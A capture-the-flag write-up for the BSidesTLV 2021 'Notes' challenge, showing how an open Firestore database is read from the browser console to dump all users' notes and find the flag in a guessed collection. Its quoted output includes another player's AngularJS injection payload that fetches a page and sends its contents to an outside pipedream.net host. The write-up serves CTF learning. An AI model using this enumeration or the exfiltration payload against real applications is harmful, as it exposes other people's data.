# Notes
* Category: Cloud
* 200 Points
* Solved by the JCTF Team

## Description

> I made an application that you can store your notes!
> 
> Browse and feel free to use it for your purpose :)

## Solution

We visit the attached website and find a react-based note-keeping application.

It has a text box for providing notes, and a submit button. Adding a note will display it in the list of "Items for Update".

Let's try to submit a new note and follow the browser Network tab in the Developer Tools to see what happens:

```
POST /google.firestore.v1.Firestore/Write/channel?database=projects%2Fnotes-d70f4%2Fdatabases%2F(default)&VER=8&gsessionid=QYHTLdO6w42YgFtBAi54B_fHkTiz0ZSqrg5M5vPdpcI&SID=WscmknaqQYD9YF-oZ1BZUw&RID=93137&AID=1&zx=oyum0qd2x67j&t=1 HTTP/1.1
Host: firestore.googleapis.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 443
Origin: https://notes.ctf.bsidestlv.com
Alt-Used: firestore.googleapis.com
Connection: keep-alive
Referer: https://notes.ctf.bsidestlv.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site

count=1
ofs=1
req0___data__={"streamToken":"GRBoQgKB9LW1","writes":[{"update":{"name":"projects/notes-d70f4/databases/(default)/documents/notes/HP265B9ykQyyj15TbAy9","fields":{"message":{"stringValue":"Test"},"uid":{"stringValue":"c2c8665c-0baf-7158-cb68-61ad8fe2d39b"}}},"currentDocument":{"exists":false}}]}
```

We see that the request is being sent to FireBase. It contains the contents of the note we've added (`"Test"`) and our user-id (`"c2c8665c-0baf-7158-cb68-61ad8fe2d39b"`). It also contains a path to the FireBase DB location (`"projects/notes-d70f4/databases/(default)/documents/notes/HP265B9ykQyyj15TbAy9"`) and a token (`"GRBoQgKB9LW1"`).

We can find the FireBase API information in one of the Javascript files:

```javascript
(this["webpackJsonpnotes-app"] = this["webpackJsonpnotes-app"] || []).push([
    [0], {
        20: function(e, t, n) {},
        21: function(e, t, n) {},
        25: function(e, t, n) {
            "use strict";
            n.r(t);
            var c = n(6),
                s = n.n(c),
                a = n(14),
                i = n.n(a),
                o = (n(20), n(21), n(15)),
                r = n(12),
                d = (n(22), n(10));
            n(26);
            d.a.initializeApp({
                apiKey: "AIzaSyDv5Gb67XqGg25afcDEh7QhUVNmTYtJjME",
                authDomain: "notes-d70f4.firebaseapp.com",
                projectId: "notes-d70f4",
                storageBucket: "notes-d70f4.appspot.com",
                messagingSenderId: "905829683791",
                appId: "1:905829683791:web:2a16df7f50b7075632d03a",
                measurementId: "G-13RYWT5D31"
            });
            var l = d.a,
                u = n(2);

            function j() {
                var e = function() {
                    return (65536 * (1 + Math.random()) | 0).toString(16).substring(1)
                };
                return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e()
            }
            var m = function() {
                    var e = function() {
                            var e = Object(c.useState)([]),
                                t = Object(r.a)(e, 2),
                                n = t[0],
                                s = t[1];
                            return Object(c.useEffect)((function() {
                                window.localStorage.getItem("uid") || window.localStorage.setItem("uid", j());
                                var e = l.firestore().collection("notes").where("uid", "==", window.localStorage.getItem("uid")).where("uid", "==", window.localStorage.getItem("uid")).onSnapshot((function(e) {
                                    var t = e.docs.map((function(e) {
                                        return Object(o.a)({
                                            id: e.id
                                        }, e.data())
                                    }));
                                    s(t)
                                }));
                                return function() {
                                    return e()
                                }
                            }), []), n
                        }(),
                        t = Object(c.useState)(""),
                        n = Object(r.a)(t, 2),
                        s = n[0],
                        a = n[1];
                    return Object(c.useEffect)((function() {
                        window.localStorage.getItem("uid") || window.localStorage.setItem("uid", j())
                    })), Object(u.jsx)("div", {
                        className: "container mt-5",
                        children: Object(u.jsx)("div", {
                            className: "d-flex justify-content-center row",
                            children: Object(u.jsxs)("div", {
                                className: "col-md-6",
                                children: [Object(u.jsxs)("div", {
                                    className: "p-4 bg-white notes",
                                    children: [Object(u.jsxs)("div", {
                                        className: "d-flex flex-row align-items-center notes-title",
                                        children: [Object(u.jsx)("h4", {
                                            children: "Q2 Goal notes"
                                        }), Object(u.jsx)("span", {
                                            className: "px-2 review-text ml-2 rounded",
                                            children: "review"
                                        })]
                                    }), Object(u.jsxs)("div", {
                                        className: "d-flex flex-row align-items-center align-content-center",
                                        children: [Object(u.jsx)("span", {
                                            className: "rounded info",
                                            children: "04/01/2020"
                                        }), Object(u.jsx)("span", {
                                            className: "dot"
                                        }), Object(u.jsx)("span", {
                                            className: "info",
                                            children: "Outlook notes"
                                        })]
                                    })]
                                }), Object(u.jsxs)("div", {
                                    className: "bg-white p-1",
                                    children: [Object(u.jsx)("hr", {}), Object(u.jsxs)("div", {
                                        className: "keyupdates p-3",
                                        children: [Object(u.jsx)("h5", {
                                            children: "Items for update"
                                        }), e.map((function(e) {
                                            return Object(u.jsxs)("div", {
                                                className: "d-flex align-items-center keyupdates-text",
                                                id: e.id,
                                                children: [Object(u.jsx)("span", {
                                                    className: "dot"
                                                }), Object(u.jsx)("span", {
                                                    children: e.message
                                                })]
                                            })
                                        }))]
                                    }), Object(u.jsx)("form", {
                                        onSubmit: function(e) {
                                            e.preventDefault(), l.firestore().collection("notes").add({
                                                message: s,
                                                uid: window.localStorage.getItem("uid")
                                            }).then((function() {
                                                a("")
                                            }))
                                        },
                                        children: Object(u.jsxs)("div", {
                                            className: "keyupdates p-3",
                                            children: [Object(u.jsx)("h5", {
                                                children: "Add new note"
                                            }), Object(u.jsx)("textarea", {
                                                name: "content",
                                                id: "noteContent",
                                                value: s,
                                                onChange: function(e) {
                                                    return a(e.currentTarget.value)
                                                }
                                            }), Object(u.jsx)("button", {
                                                type: "submit",
                                                className: "btn btn-primary",
                                                id: "noteSubmit",
                                                children: "Submit a note"
                                            })]
                                        })
                                    })]
                                })]
                            })
                        })
                    })
                },
                b = function(e) {
                    e && e instanceof Function && n.e(3).then(n.bind(null, 27)).then((function(t) {
                        var n = t.getCLS,
                            c = t.getFID,
                            s = t.getFCP,
                            a = t.getLCP,
                            i = t.getTTFB;
                        n(e), c(e), s(e), a(e), i(e)
                    }))
                };
            i.a.render(Object(u.jsx)(s.a.StrictMode, {
                children: Object(u.jsx)(m, {})
            }), document.getElementById("root")), b()
        }
    },
    [
        [25, 1, 2]
    ]
]);
```

There's nothing stopping us from connecting to the database ourselves, and [trying to extract public information](https://firebase.google.com/docs/firestore/quickstart#web-v8_1). We can even do it from within the browser console. We start with some initializations:

```javascript
// Add the FireBase API:

var script = document.createElement('script');
script.type = 'text/javascript';
script.src = "https://www.gstatic.com/firebasejs/8.7.1/firebase-app.js";
document.head.appendChild(script);

var script = document.createElement('script');
script.type = 'text/javascript';
script.src = "https://www.gstatic.com/firebasejs/8.7.1/firebase-firestore.js";
document.head.appendChild(script);

// Initialize Cloud Firestore through Firebase, based on API details we found earlier:
var c = firebase.initializeApp({
            apiKey: "AIzaSyDv5Gb67XqGg25afcDEh7QhUVNmTYtJjME",
            authDomain: "notes-d70f4.firebaseapp.com",
            projectId: "notes-d70f4",
            storageBucket: "notes-d70f4.appspot.com",
            messagingSenderId: "905829683791",
            appId: "1:905829683791:web:2a16df7f50b7075632d03a",
            measurementId: "G-13RYWT5D31"
        });
```

Then try to read all the notes with:

```javascript
c.firestore().collection("notes").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
        console.log(doc.id + ' => ' + doc.data().message);
    });
});
```

That returns all the notes that all users entered. We can try to filter the results with:

```javascript
c.firestore().collection("notes").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
		msg = doc.data().message;
		if (msg.includes("flag")) {
        	console.log(doc.id + ' => ' + doc.data().message);
        }
    });
});

```

We get back a reduced set, but none are related to the real flag:

```
44FpMEvTNPNKeoglPjHJ => {{ flag }}
63b6NGGQ5jUwv7k3L3m9 => get flagz
8HW3Z6WVlkC0I46YJBJW => flag
flag
BZxcAsFOgx0J6gxxozaN => flag
Gpr2edxdm0LG5dQDmxLC => flag
Hq7yh4ztSiR9tjSRxMoW => flag
JdypcM3GdARMjHCUhWIc => https://notes.ctf.bsidestlv.com/flag
M0RoZ5H2eTJWMP9muSCC => flag
NX5gdL8Ik5LYaBrqwmuo => flag
Qnj8Kjs6s1M1q7CFqVFT => flag
TWchL7XSijengBeVoPMo => flag
ZNilD49Azmy6p1F7qQL3 => flag
hKViy0uzya8463pRXw0u => flag
jEBTGcVqFtw1whTIa6ji => flag
lrHpCpc3rRSJ1seL6jA1 => flag
print flag
qys2Hpvk8rIY8EwNXteR => <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script>
<div ng-app>
    {{constructor.constructor("fetch('/csp-two-flag').then(res=>{return res.text()}).then(body=>{fetch('//ene9q890m5b39.x.pipedream.net//?'+body)})")()}}
</div>
rmqyn3gmIB4Zzotz07VD => flag
flag
falg
aflg
fagl
tOs2k1QA8gb8CuSvzkc7 => flag
tkGxSUTglsrD6THWFAvs => flag
yIwRMrBmazL3gxfRBjEw => flag
```

Searching for the flag format doesn't help either:

```javascript
c.firestore().collection("notes").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
        msg = doc.data().message;
        if (msg.includes("BSidesTLV2021")) {
            console.log(doc.id + ' => ' + doc.data().message);…
```

Output:

```
YXqusb3Idw9IiGnYRe95 => BSidesTLV2021{a}
fWnF69WMFib5oKxJbEMs => BSidesTLV2021
j2wgGvpP8mUAPxQefIOS => BSidesTLV2021
rHC22zGdjIXE1IzmPTAI => BSidesTLV2021
wwBdyuxLvKn7OOHKZaOW => BSidesTLV2021
```

Up to now we've been trying to extract information from the `notes` collection. What if the flag is in another collection? After all, we can review all the notes in the `notes` collection, and if nothing there seems useful we must find another place to look at. 

The public JS APIs apparently don't allow listing all collections, but we can try to guess the name and see if we're lucky. For example, `flag`:

```javascript
c.firestore().collection("flag").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
        console.log(doc.id + ' => ' + doc.data().message);
    });
});
```

We get a single result:

```
2JjBihwBuGKEFjA36pOw => BSidesTLV2021{F1r3B4s31sn0ts0s3cur3d}
```

